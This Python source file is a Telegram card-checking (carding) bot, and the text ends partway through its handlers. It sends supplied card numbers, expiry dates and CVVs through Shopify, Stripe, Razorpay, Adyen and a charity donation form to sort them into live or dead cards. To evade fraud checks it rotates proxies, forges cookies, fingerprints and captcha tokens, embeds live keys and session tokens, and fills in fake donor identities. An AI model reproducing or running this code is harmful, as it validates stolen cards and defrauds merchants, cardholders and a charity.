import asyncio
import os
import re
import random
import json
import time
import requests
import urllib3
import uuid
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from playwright.async_api import async_playwright
import nest_asyncio
nest_asyncio.apply()

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN environment variable not set!")

# Proxy
PROXY_FILE = "proxies.txt"
proxy_list = []
failed_proxies = set()
proxy_index = 0

def load_proxies():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip() and ':' in line]
        return len(proxy_list)
    except:
        proxy_list = []
        return 0

def get_proxy():
    global proxy_index, proxy_list, failed_proxies
    if not proxy_list:
        return None
    attempts = 0
    while attempts < len(proxy_list):
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        if proxy in failed_proxies:
            attempts += 1
            continue
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    failed_proxies.clear()
    if proxy_list:
        return {"http": f"http://{proxy_list[0]}", "https": f"http://{proxy_list[0]}"}
    return None

def mark_proxy_failed(proxy_dict):
    if proxy_dict:
        proxy_str = proxy_dict.get('http', '').replace('http://', '')
        if proxy_str:
            failed_proxies.add(proxy_str)

# ================= SHOPIFY =================
async def shopify_check(card, month, year, cvv):
    url = "https://web-production-669be.up.railway.app/shopify"
    params = {"site": "https://the3doodler.com/", "cc": f"{card}|{month}|{year}|{cvv}"}
    proxy = get_proxy()
    try:
        start = time.time()
        resp = requests.get(url, params=params, proxies=proxy, timeout=30)
        elapsed = time.time() - start
        if resp.status_code == 200:
            data = resp.json()
            status = data.get('Status', False)
            gateway = data.get('Gateway', 'Unknown')
            price = data.get('Price', 'N/A')
            resp_msg = data.get('Response', 'Unknown')
            if status is True:
                return ("✅ APPROVED", f"Charged | Price: ${price}", True)
            elif 'order_placed' in str(resp_msg).lower():
                return ("✅ APPROVED", f"Order placed | ${price}", True)
            elif 'declined' in str(resp_msg).lower():
                return ("❌ DECLINED", f"Declined: {resp_msg}", False)
            else:
                return ("⚠️ UNKNOWN", resp_msg, None)
        else:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"HTTP {resp.status_code}", None)
    except Exception as e:
        if proxy: mark_proxy_failed(proxy)
        return ("❌ ERROR", str(e)[:100], None)

# ================= STRIPE =================
async def stripe_check(card, month, year, cvv):
    try:
        session = requests.Session()
        session.cookies.set('__Secure-better-auth.session_token', 'IGplOCY9C9nv0LbgIe1u9LHLBRRz8MYe.WIu%2ByMsXOkJstA%2BsXq7VPWEeRM%2FJDPfJefS7DxhDH54%3D')
        session.cookies.set('__stripe_mid', '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68')
        session.cookies.set('ref_gclid', 'EAIaIQobChMI77n0z-CTlQMVPkKRBR29VzsWEAAYASAAEgIKJPD_BwE')
        session.cookies.set('ref_url', 'https://www.google.com/')
        session.cookies.set('_gid', f"GA1.2.{random.randint(100000000,999999999)}.{int(time.time())}")
        session.cookies.set('_ga', f"GA1.2.{random.randint(100000000,999999999)}.{int(time.time())}")
        session.cookies.set('testcookie', '1')
        session.cookies.set('__stripe_sid', f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}")
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-SS,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        })
        proxy = get_proxy()
        if proxy:
            session.proxies.update(proxy)
        # Create payment method
        formatted = f"{card[:4]} {card[4:8]} {card[8:12]} {card[12:]}"
        data = {
            'type': 'card',
            'card[number]': formatted,
            'card[cvc]': cvv,
            'card[exp_year]': year,
            'card[exp_month]': month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '99501',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+payment-element',
            'referrer': 'https://instantproxies.com',
            'time_on_page': str(random.randint(1000,99999)),
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'standard',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_id]': f"elements_session_{random_hex(10)}",
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(6)}",
            'muid': '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68',
            'sid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}",
            'key': 'pk_live_51JNqHcDqkIL4eWbXsNhdA3tWu4k4MYDHJeWjBJRrEIaljus0goMwf1oZQdki3LZqPwjBEqzDojGQ66vAMPFGIeLa008mBfHVrq',
            '_stripe_version': '2025-03-31.basil',
            'radar_options[hcaptcha_token]': f"P1_{random_hex(100)}"
        }
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        if resp.status_code != 200:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"Stripe PM error: {resp.status_code}", None)
        pm_data = resp.json()
        pm_id = pm_data.get('id')
        if not pm_id:
            return ("❌ ERROR", "No PM ID", None)
        intent_headers = {
            'authority': 'instantproxies.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://instantproxies.com',
            'referer': 'https://instantproxies.com/dashboard/checkout?plan=DC_1',
        }
        payload = {
            "productId": "price_DATACENTER_BASE_PLAN",
            "paymentMethodId": pm_id,
            "quantity": 1,
            "proxyType": "datacenter"
        }
        intent_resp = session.post('https://instantproxies.com/api/payments/create-subscription-intent', headers=intent_headers, json=payload, timeout=30)
        if intent_resp.status_code == 200:
            sub_data = intent_resp.json()
            if sub_data.get('subscriptionId'):
                return ("✅ APPROVED", f"Subscription ID: {sub_data['subscriptionId']}", True)
            else:
                return ("❌ DECLINED", "Subscription failed", False)
        else:
            if proxy: mark_proxy_failed(proxy)
            return ("❌ ERROR", f"Stripe sub error: {intent_resp.status_code}", None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)

# ================= RAZORPAY =================
async def razorpay_check(card, month, year, cvv):
    try:
        session = requests.Session()
        KEY_ID = "rzp_live_T1qlctbJRtHxhL"
        SESSION_TOKEN = "B00EC195C8A1A5509FF105D4840A299626B18E2F71D22165981A5265F5512CF2A0431640385AE22F4E3940E22C83B1ED766BAFEDBF45CE2172AF62DB8F9AFB6FD02428878357228743CB005F4AF6E92887EF53A9F7008754289E37026428E1C5C9D293E37B300159"
        KEYLESS_HEADER = "api_v1%3AwaVXKuSoQNd3q0C8gnJNo%2BFQQAGuoxXg34FNrVQRiStweDR61DHPRH%2BDmLSCv7zj23Nn7Tpg2qQjxK%2FELdgkmRNfTrgAJw%3D%3D"
        VPA = "9023510377"
        # order
        order_resp = session.post('https://api.razorpay.com/v1/payment_pages/pl_OqYzfw0fykO01F/order',
                                  headers={'Content-Type': 'application/json', 'Origin': 'https://razorpay.me', 'Referer': 'https://razorpay.me/'},
                                  json={"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": "ppi_OqYzfxzDW3KJxZ", "amount": 100}]})
        if order_resp.status_code != 200:
            return ("❌ ERROR", "Order creation failed", None)
        order_json = order_resp.json()
        order_id = order_json.get('id')
        checkout_id = order_json.get('line_items', [{}])[0].get('id')
        if not order_id or not checkout_id:
            return ("❌ ERROR", "Missing order/checkout id", None)
        # vpa
        vpa_data = {"entity": "vpa", "value": VPA, "_[library]": "checkoutjs"}
        vpa_headers = {'Content-type': 'application/x-www-form-urlencoded', 'x-session-token': SESSION_TOKEN,
                       'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'}
        vpa_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/validate/account?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=vpa_data, headers=vpa_headers)
        if vpa_resp.status_code != 200:
            return ("❌ ERROR", "VPA validation failed", None)
        vpa_json = vpa_resp.json()
        vpa_token = vpa_json.get('vpa_token')
        if not vpa_token:
            return ("❌ ERROR", "No vpa token", None)
        # payment
        device_id = f"1.7c1caf29fb658b393da7a3f13a3ef1e2ac459df5.1781928244567.{random.randint(10000000,99999999)}"
        shield_fhash = "d9a51addd9d0247b1aaf8457e2d4359cfe706632"
        user_risk_token = 'W3sibmFtZSI6InNhcmRpbmUiLCJtZXRhZGF0YSI6eyJzZXNzaW9uX2lkIjoiVDQ4UXFxaTFIeWUzM04ifX1d'
        payment_data = {
            "notes[comment]": "", "payment_link_id": "pl_OqYzfw0fykO01F", "key_id": KEY_ID,
            "contact": "+919023510377", "email": "abc@gmail.com", "currency": "INR",
            "_[checkout_id]": checkout_id, "_[device.id]": device_id, "_[library]": "checkoutjs",
            "_[library_src]": "no-src", "_[current_script_src]": "no-src", "_[platform]": "browser",
            "_[env]": "", "_[is_magic_script]": "false", "_[os]": "android",
            "_[referer]": "https://razorpay.me/@mstechnomedia", "_[shield][fhash]": shield_fhash,
            "_[shield][tz]": "330", "_[device_id]": device_id, "_[build]": "27697546038",
            "_[request_index]": "0", "amount": "100", "order_id": order_id,
            "user_risk_providers_token": user_risk_token, "method": "card",
            "card[number]": card, "card[cvv]": cvv, "card[name]": "64kbitters",
            "card[expiry_month]": month, "card[expiry_year]": year, "save": "0",
            "billing_address[country]": "IN", "billing_address[postal_code]": "360001",
            "billing_address[city]": "Rajkot", "billing_address[state]": "Gujarat",
            "billing_address[line1]": "Na", "billing_address[line2]": "Na",
            "currency_request_id": checkout_id, "dcc_currency": "AZN", "_[shield_context]": ""
        }
        pay_headers = {'Content-type': 'application/x-www-form-urlencoded', 'x-session-token': SESSION_TOKEN,
                       'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'}
        pay_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=payment_data, headers=pay_headers)
        if pay_resp.status_code != 200:
            return ("❌ ERROR", f"Payment error: {pay_resp.status_code}", None)
        text = pay_resp.text
        if 'error' in text and 'SERVER_ERROR' in text:
            return ("❌ DECLINED", "Card Declined", False)
        if '3ds' in text.lower() or 'authentication' in text.lower():
            return ("🔒 3DS", "3DS Required", None)
        if 'success' in text.lower() and 'true' in text.lower():
            return ("✅ APPROVED", "Charged ₹100", True)
        return ("⚠️ UNKNOWN", text[:100], None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)

# ================= ADYEN =================
async def adyen_check(card, month, year, cvv):
    try:
        session = requests.Session()
        # analytics
        analytics_resp = session.post('https://checkoutanalytics-live.adyen.com/checkoutanalytics/v3/analytics?clientKey=live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH',
                                      json={"version": "6.12.0","channel":"Web","platform":"Web","buildType":"esm","locale":"en-US","referrer":"https://picsart.com/pricing/special-offer/gift","screenWidth":1920,"containerWidth":0,"component":"scheme","flavor":"components","level":"all"},
                                      headers={'Content-Type':'application/json'})
        if analytics_resp.status_code != 200:
            return ("❌ ERROR", "Analytics failed", None)
        try:
            checkout_id = analytics_resp.json().get('checkoutAttemptId')
        except:
            checkout_id = None
        if not checkout_id:
            checkout_id = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}ED14829E1BC0646EA2213FD1802177333785AB3E55621930DD6796067D7B7034"
        # token
        token_resp = session.get('https://picsart.com/pricing/special-offer/gift',
                                 headers={'accept':'*/*','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/145.0.0.0 Safari/537.36'})
        token = None
        if token_resp.status_code == 200:
            match = re.search(r'"access_token":"([^"]+)"', token_resp.text)
            if match:
                token = match.group(1)
        if not token:
            return ("❌ ERROR", "No access token", None)
        # encrypt
        enc_resp = session.post('https://asianprozyy.us/encrypt/adyenv2',
                                json={"card":f"{card}|{month}|{year}|{cvv}",
                                      "adyenKey":"10001|C6EF5A6E98A3FFE920C6347D16B8203F4A478CFA672D4CC76F3D0976AB81F51BFDCEB81155A05B677D7892F567BDBA9149009787838F9E7F619105717CB3A068FA636B9AF967876B978B0E55E53E86E58F4F62AA822FE79B0211B6A6007D461D7E13DFFD191EAD8AC6C1C877BB11A34544FE42B4FE021793C29620B896CBDC6C0680D0C6C9E59AC6239EDF5BE28DEB27DA9F535C3E6FFE1C2B4EFED06309F396AC3E532B3395A43B510293AEFF7D8EF9DEB36C98FF35C351DD5704BA14FE1BAC7A21FBB493F7CEA5CEBAB1BFE15CAF2BFBE9840353EE628B8915F8B3847AB8AE1761A15D506844E37C7104E466DE17D51625806692EC8C25072280D715319059",
                                      "version":"5.5.1","origin":"https://picsart.com","originKey":"live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH"})
        if enc_resp.status_code != 200:
            return ("❌ ERROR", "Encryption failed", None)
        enc_json = enc_resp.json()
        encrypted_card = enc_json.get('encryptedCardNumber')
        encrypted_month = enc_json.get('encryptedExpiryMonth')
        encrypted_year = enc_json.get('encryptedExpiryYear')
        encrypted_cvv = enc_json.get('encryptedSecurityCode')
        risk_data = enc_json.get('riskData')
        if not encrypted_card:
            return ("❌ ERROR", "Encryption failed", None)
        brand = "visa" if card.startswith('4') else "mc"
        payload = {
            "items": [{"id":"gift_pro_yearly"}],
            "adyenData": {
                "riskData":{"clientData":risk_data},
                "paymentMethod":{
                    "type":"scheme","holderName":"",
                    "encryptedCardNumber":encrypted_card,
                    "encryptedExpiryMonth":encrypted_month,
                    "encryptedExpiryYear":encrypted_year,
                    "encryptedSecurityCode":encrypted_cvv,
                    "brand":brand,
                    "checkoutAttemptId":checkout_id,
                    "sdkData":"eyJzY2hlbWFWZXJzaW9uIjoxLCJjcmVhdGVkQXQiOjE3ODIwMjIxMDYyOTgsImNoYW5uZWwiOiJ3ZWIiLCJwbGF0Zm9ybSI6IndlYiIsInNka1ZlcnNpb24iOiI2LjM1LjAiLCJwYXltZW50TWV0aG9kQmVoYXZpb3IiOiJuYXRpdmVDb21wb25lbnQiLCJhbmFseXRpY3MiOnsiY2hlY2tvdXRBdHRlbXB0SWQiOiJkMzI5MDQ0MC1lM2U1LTRiYjAtYmQzZC1iZWFjYWE3OTZjNmIxNzgyMDIzNTY4ODM4RUQxNDgyOUUxQkMwNjQ2RUEyMjEzRkQxODAyMTc3MzMzNzg1QUIzRTU1NjIxOTMwREQ2Nzk2MDY3RDdCNzAzNCJ9LCJyaXNrRGF0YSI6eyJjbGllbnREYXRhIjoiZXlKMlpYSnphVzl1SWpvaU1TNHdMakFpTENKa1pYWnBZMlZHYVc1blpYSndjbWx1ZENJNkltSmpNRGN3WkRjME1qRmlOamxsWVdNM01XUmxZbU01TW1ZNU1XTTFORFl3SWl3aWNHVnljMmx6ZEdWdWRFTnZiMnRwWlNJNld5SmZjbkJmZFdsa1BXWXdPVEE0TjJVMExXRTNNV010TjJGak9DMDVPV0U1TFdRMllUVmpOR0ZpWWpNME55SmRMQ0pqYjIxd2IyNWxiblJ6SWpwN0luWmxjbk5wYjI0aU9pSXhMakF1TkNJc0ltWnBibWRsY25CeWFXNTBRMjl0Y0c5dVpXNTBjeUk2ZXlKaGRXUnBieUk2TVRJMExqQTRNRGN5TnpZMk1UQTFNRE16TENKallXNTJZWE1pT25zaWQybHVaR2x1WnlJNmRISjFaU3dpWjJWdmJXVjBjbmtpT2lJMVl6ZGxOamcyTVRZMVpUUTBaREV4TXpJeU5URmxNbVZsWVRsbVpHRm1NQ0lzSW5SbGVIUWlPaUppTWpabU5EYzBaVFppTURFeU1qVmxOREEwTW1KaFlUSTBZalV4WXpobU1TSjlMQ0prWVhSbFZHbHRaVXh2WTJGc1pTSTZJbVZ1TFVkQ0lpd2laR1YyYVdObFRXVnRiM0o1SWpvNExDSm1iMjUwVUhKbFptVnlaVzVqWlhNaU9uc2laR1ZtWVhWc2RDSTZNVFkwTGpjeE9EYzFMQ0poY0hCc1pTSTZNVFkwTGpjeE9EYzFMQ0p6WlhKcFppSTZNVFkwTGpjeE9EYzFMQ0p6WVc1eklqb3hORFV1T1RBMk1qVXNJbTF2Ym04aU9qRXpNaTQyTWpVc0ltMXBiaUk2TVRBdU1qazJPRGMxTENKemVYTjBaVzBpT2pFME5TNDVNRFl5Tlgwc0ltWnZiblJ6SWpwYkluTmhibk10YzJWeWFXWXRkR2hwYmlKZExDSm9ZWEprZDJGeVpVTnZibU4xY25KbGJtTjVJam80TENKcGJtUmxlR1ZrUkVJaU9uUnlkV1VzSW14aGJtZDFZV2RsY3lJNld5SmxiaTFUVXlKZExDSnNiMk5oYkZOMGIzSmhaMlVpT25SeWRXVXNJbTFoZEdnaU9pSTVOV1F4WVdVNVlUZzNaV1JtTVRjNU1qQmtOR1EzWldVMVlXRmxPV1UwTVNJc0luQnNZWFJtYjNKdElqb2lUR2x1ZFhnZ1lYSnRkamd4SWl3aWMyTnlaV1Z1Um5KaGJXVWlPbHN3TERBc01Dd3dYU3dpYzJOeVpXVnVVbVZ6YjJ4MWRHbHZiaUk2V3prNE5TdzBORFJkTENKelpYTnphVzl1VTNSdmNtRm5aU0k2ZEhKMVpTd2lkR2x0WlhwdmJtVWlPaUpCYzJsaEwwTmhiR04xZEhSaElpd2lkWE5sY2tGblpXNTBSR0YwWVNJNmV5SmljbUZ1WkhNaU9sc2lRMmh5YjIxcGRXMGlYU3dpYlc5aWFXeGxJanAwY25WbExDSndiR0YwWm05eWJTSTZJa0Z1WkhKdmFXUWlMQ0poY21Ob2FYUmxZM1IxY21VaU9pSWlMQ0ppYVhSdVpYTnpJam9pSWl3aWJXOWtaV3dpT2lKdGIzUnZJR2MxTnlCd2IzZGxjaUlzSW5Cc1lYUm1iM0p0Vm1WeWMybHZiaUk2SWpFMkxqQXVNQ0o5TENKM1pXSkhiRUpoYzJsamN5STZleUoyWlhKemFXOXVJam9pVjJWaVIwd2dNUzR3SUNoUGNHVnVSMHdnUlZNZ01pNHdJRU5vY205dGFYVnRLU0lzSW5abGJtUnZjaUk2SWxkbFlrdHBkQ0lzSW5abGJtUnZjbFZ1YldGemEyVmtJam9pUjI5dloyeGxJRWx1WXk0Z0tGRjFZV3hqYjIxdEtTSXNJbkpsYm1SbGNtVnlJam9pVjJWaVMybDBJRmRsWWtkTUlpd2ljbVZ1WkdWeVpYSlZibTFoYzJ0bFpDSTZJa0ZPUjB4RklDaFJkV0ZzWTI5dGJTd2dRV1J5Wlc1dklDaFVUU2tnTnpFd0xDQlBjR1Z1UjB3Z1JWTWdNeTR5S1NJc0luTm9ZV1JwYm1kTVlXNW5kV0ZuWlZabGNuTnBiMjRpT2lKWFpXSkhUQ0JIVEZOTUlFVlRJREV1TUNBb1QzQmxia2RNSUVWVElFZE1VMHdnUlZNZ01TNHdJRU5vY205dGFYVnRLU0o5TENKM1pXSkhiRVY0ZEdWdWMybHZibk1pT25zaVkyOXVkR1Y0ZEVGMGRISnBZblYwWlhNaU9uc2lZV3h3YUdFaU9pSjBjblZsSWl3aVlXNTBhV0ZzYVdGeklqb2lkSEoxWlNJc0ltUmxjSFJvSWpvaWRISjFaU0lzSW1SbGMzbHVZMmh5YjI1cGVtVmtJam9pWm1Gc2MyVWlMQ0ptWVdsc1NXWk5ZV3B2Y2xCbGNtWnZjbTFoYm1ObFEyRjJaV0YwSWpvaVptRnNjMlVpTENKd2IzZGxjbEJ5WldabGNtVnVZMlVpT2lKc2IzY3RjRzkzWlhJaUxDSndjbVZ0ZFd4MGFYQnNhV1ZrUVd4d2FHRWlPaUowY25WbElpd2ljSEpsYzJWeWRtVkVjbUYzYVc1blFuVm1abVZ5SWpvaVptRnNjMlVpTENKemRHVnVZMmxzSWpvaVptRnNjMlVpTENKNGNrTnZiWEJoZEdsaWJHVWlPaUptWVd4elpTSjlMQ0p3WVhKaGJXVjBaWEp6SWpvaVpEVTVPR0V3TkRkbU5tSmhaRGd6TTJJMk5tUTVaVEE1TlRoaU16SXpZV0VpTENKemFHRmtaWEpRY21WamFYTnBiMjV6SWpvaU9EaGtaVEpsWkRWbU5USmpOekEyTm1OaFlqaGlOakpoTnpRM1pUaG1NVGtpTENKbGVIUmxibk5wYjI1eklqcGJJa0ZPUjB4RlgybHVjM1JoYm1ObFpGOWhjbkpoZVhNaUxDSkZXRlJmWW14bGJtUmZiV2x1YldGNElpd2lSVmhVWDJOdmJHOXlYMkoxWm1abGNsOW9ZV3htWDJac2IyRjBJaXdpUlZoVVgyUnBjMnB2YVc1MFgzUnBiV1Z5WDNGMVpYSjVJaXdpUlZoVVgyWnNiMkYwWDJKc1pXNWtJaXdpUlZoVVgzUmxlSFIxY21WZlkyOXRjSEpsYzNOcGIyNWZZbkIwWXlJc0lrVllWRjkwWlhoMGRYSmxYMk52YlhCeVpYTnphVzl1WDNKbmRHTWlMQ0pGV0ZSZmRHVjRkSFZ5WlY5bWFXeDBaWEpmWVc1cGMzOTBjbTl3YVdNaUxDSkZXRlJmYzFKSFFpSXNJa3RJVWw5d1lYSmhiR3hsYkY5emFHRmtaWEpmWTI5dGNHbHNaU0lzSWs5RlUxOWxiR1Z0Wlc1MFgybHVaR1Y0WDNWcGJuUWlMQ0pQUlZOZlptSnZYM0psYm1SbGNsOXRhWEJ0WVhBaUxDSlBSVk5mYzNSaGJtUmhjbVJmWkdWeWFYWmhkR2wyWlhNaUxDSlBSVk5mZEdWNGRIVnlaVjltYkc5aGRDSXNJazlGVTE5MFpYaDBkWEpsWDJac2IyRjBYMnhwYm1WaGNpSXNJazlGVTE5MFpYaDBkWEpsWDJoaGJHWmZabXh2WVhRaUxDSlBSVk5mZEdWNGRIVnlaVjlvWVd4bVgyWnNiMkYwWDJ4cGJtVmhjaUlzSWs5RlUxOTJaWEowWlhoZllYSnlZWGxmYjJKcVpXTjBJaXdpVjBWQ1IweGZZMjlzYjNKZlluVm1abVZ5WDJac2IyRjBJaXdpVjBWQ1IweGZZMjl0Y0hKbGMzTmxaRjkwWlhoMGRYSmxYMkZ6ZEdNaUxDSlhSVUpIVEY5amIyMXdjbVZ6YzJWa1gzUmxlSFIxY21WZlpYUmpJaXdpVjBWQ1IweGZZMjl0Y0hKbGMzTmxaRjkwWlhoMGRYSmxYMlYwWXpFaUxDSlhSVUpIVEY5amIyMXdjbVZ6YzJWa1gzUmxlSFIxY21WZmN6TjBZeUlzSWxkRlFrZE1YMk52YlhCeVpYTnpaV1JmZEdWNGRIVnlaVjl6TTNSalgzTnlaMklpTENKWFJVSkhURjlrWldKMVoxOXlaVzVrWlhKbGNsOXBibVp2SWl3aVYwVkNSMHhmWkdWaWRXZGZjMmhoWkdWeWN5SXNJbGRGUWtkTVgyUmxjSFJvWDNSbGVIUjFjbVVpTENKWFJVSkhURjlzYjNObFgyTnZiblJsZUhRaUxDSlhSVUpIVEY5dGRXeDBhVjlrY21GM0lsMHNJbVY0ZEdWdWMybHZibEJoY21GdFpYUmxjbk1pT2lKaVlqaGlZVEV4T0RVeU16RTJPR1k0WVRJNU9EVTJOemMxTXpnNE1tWm1NU0o5ZlN3aWRtbHphWFJsWkZCaFoyVnpJanBiWFN3aVltRjBkR1Z5ZVVsdVptOGlPbnNpWW1GMGRHVnllVXhsZG1Wc0lqb3pMQ0ppWVhSMFpYSjVRMmhoY21kcGJtY2lPblJ5ZFdWOUxDSmliM1JFWlhSbFkzUnZjbk1pT25zaWQyVmlSSEpwZG1WeUlqcG1ZV3h6WlN3aVkyOXZhMmxsUlc1aFlteGxaQ0k2ZEhKMVpTd2lhR1ZoWkd4bGMzTkNjbTkzYzJWeUlqcG1ZV3h6WlN3aWJtOU1ZVzVuZFdGblpYTWlPbVpoYkhObExDSnBibU52Ym5OcGMzUmxiblJGZG1Gc0lqcG1ZV3h6WlN3aWFXNWpiMjV6YVhOMFpXNTBVR1Z5YldsemMybHZibk1pT21aaGJITmxMQ0prYjIxTllXNXBjSFZzWVhScGIyNGlPbVpoYkhObExDSmhjSEJXWlhKemFXOXVVM1Z6Y0dsamFXOTFjeUk2Wm1Gc2MyVXNJbVoxYm1OMGFXOXVRbWx1WkZOMWMzQnBZMmx2ZFhNaU9uUnlkV1VzSW1KdmRFbHVWWE5sY2tGblpXNTBJanBtWVd4elpTd2lkMmx1Wkc5M1UybDZaVk4xYzNCcFkybHZkWE1pT21aaGJITmxMQ0ppYjNSSmJsZHBibVJ2ZDBWNGRHVnlibUZzSWpwbVlXeHpaU3dpZDJWaVIwd2lPbVpoYkhObGZYMTkifX0="
                },
                "browserInfo":{"acceptHeader":"*/*","javaEnabled":False,"colorDepth":24,"language":"en-SS","screenHeight":985,"screenWidth":444,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36","timeZoneOffset":-330},
                "origin":"https://picsart.com",
                "clientStateDataIndicator":True
            },
            "redirectUrl":"https%3A%2F%2Fpicsart.com%2Fpricing%2Fspecial-offer%2Fgift",
            "analyticsInfo":{"impact_click_id":""}
        }
        pay_headers = {
            'authority':'api.picsart.com','accept':'*/*','accept-language':'en-US,en;q=0.9',
            'content-type':'application/json','deviceid':'a.s.mqndoz2c.7757675f-f50e-440b-81ab-bffd1ce7890a',
            'origin':'https://picsart.com','platform':'website','referer':'https://picsart.com/',
            'sec-ch-ua':'"Chromium";v="139", "Not;A=Brand";v="99"','sec-ch-ua-mobile':'?1',
            'sec-ch-ua-platform':'"Android"',
            'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-app-authorization':f'Bearer {token}'
        }
        pay_resp = session.post('https://api.picsart.com/shop/subscription/adyen/purchase', headers=pay_headers, json=payload, timeout=30)
        if pay_resp.status_code != 200:
            return ("❌ ERROR", f"Payment error: {pay_resp.status_code}", None)
        resp_text = pay_resp.text
        if 'resultCode":"Authorised"' in resp_text:
            return ("✅ APPROVED", "Payment Authorised", True)
        elif 'resultCode":"Refused"' in resp_text:
            return ("❌ DECLINED", "Refused", False)
        elif 'action' in resp_text and '3ds' in resp_text.lower():
            return ("🔒 3DS", "3DS Required", None)
        else:
            return ("⚠️ UNKNOWN", resp_text[:100], None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)

# ================= AUTHORIZE (McLean) =================
async def authorize_check(card, month, year, cvv):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--disable-dev-shm-usage','--no-sandbox'])
            context = await browser.new_context()
            page = await context.new_page()
            await page.goto("https://giving.mclean.org/#gf_18", wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_selector("input#input_18_37_1", timeout=10000)
            donor = random_donor()
            await page.click("input[name='input_18_1'][value='1000']")
            await page.select_option("select#input_18_2", label="The McLean Fund")
            await page.fill("input#input_18_3_3", donor["first"])
            await page.fill("input#input_18_3_6", donor["last"])
            await page.fill("input#input_18_4", donor["email"])
            await page.select_option("select#input_18_5_1", label="United States")
            await page.fill("input#input_18_5_4", donor["address"])
            await page.fill("input#input_18_5_5", donor["city"])
            await page.select_option("select#input_18_5_6", label=donor["state"])
            await page.fill("input#input_18_5_7", donor["zip"])
            await page.fill("input#input_18_37_1", card)
            await page.fill("input#input_18_37_2", f"{month}/{year}")
            await page.fill("input#input_18_37_3", cvv)
            async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=15000) as resp:
                await page.click("input#gform_submit_button_18")
            response = await resp.value
            body = await response.text()
            await context.close()
            await browser.close()
            if "approved" in body.lower() or "success" in body.lower():
                return ("✅ APPROVED", "Card Live", True)
            elif "do not honor" in body.lower() or "declined" in body.lower():
                return ("❌ DECLINED", "Card Dead", False)
            else:
                return ("⚠️ UNKNOWN", body[:100], None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)

# ================= UTILITY =================
def random_donor():
    first = random.choice(["John","Mary","Robert","Jennifer","Michael","Linda"])
    last = random.choice(["Smith","Johnson","Williams","Brown","Jones"])
    email = f"{first.lower()}{random.randint(100,999)}@gmail.com"
    return {"first": first, "last": last, "email": email, "address": random.choice(["123 Main St","456 Oak Ave"]), "city": random.choice(["Boston","New York"]), "state": random.choice(["MA","NY"]), "zip": random.choice(["02101","10001"])}

def random_hex(length):
    return ''.join(random.choices('0123456789abcdef', k=length))

# ================= TELEGRAM HANDLERS =================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = (
